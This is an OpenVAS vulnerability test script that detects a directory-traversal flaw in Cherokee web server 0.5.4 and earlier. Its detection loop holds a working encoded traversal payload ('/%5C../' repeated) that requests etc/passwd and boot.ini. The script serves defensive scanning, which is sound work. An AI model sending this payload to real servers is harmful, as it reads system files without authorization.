###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cherokee_40831.nasl 8510 2018-01-24 07:57:42Z teissa $
#
# Cherokee URI Directory Traversal Vulnerability and Information Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Cherokee is prone to a directory-traversal vulnerability and an information-
disclosure vulnerability because the application fails to sufficiently
sanitize user-supplied input.

Exploiting the issues may allow an attacker to obtain sensitive
information that could aid in further attacks.

Cherokee 0.5.4 and prior versions are vulnerable.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100678");
 script_version("$Revision: 8510 $");
 script_tag(name:"last_modification", value:"$Date: 2018-01-24 08:57:42 +0100 (Wed, 24 Jan 2018) $");
 script_tag(name:"creation_date", value:"2010-06-15 13:44:31 +0200 (Tue, 15 Jun 2010)");
 script_bugtraq_id(40831);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_name("Cherokee URI Directory Traversal Vulnerability and Information Disclosure Vulnerability");


 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web Servers");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("gb_get_http_banner.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("Cherokee/banner");
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/40831");
 script_xref(name : "URL" , value : "http://www.alobbs.com/modules.php?op=modload&name=cherokee&file=index");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/511814");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:8080);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if(!banner || "Cherokee" >!< banner)exit(0);

files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");

foreach file (keys(files)) {
   
  url =  string("/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../",files[file]); 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_message(port:port);
    exit(0);

  }
}

exit(0);
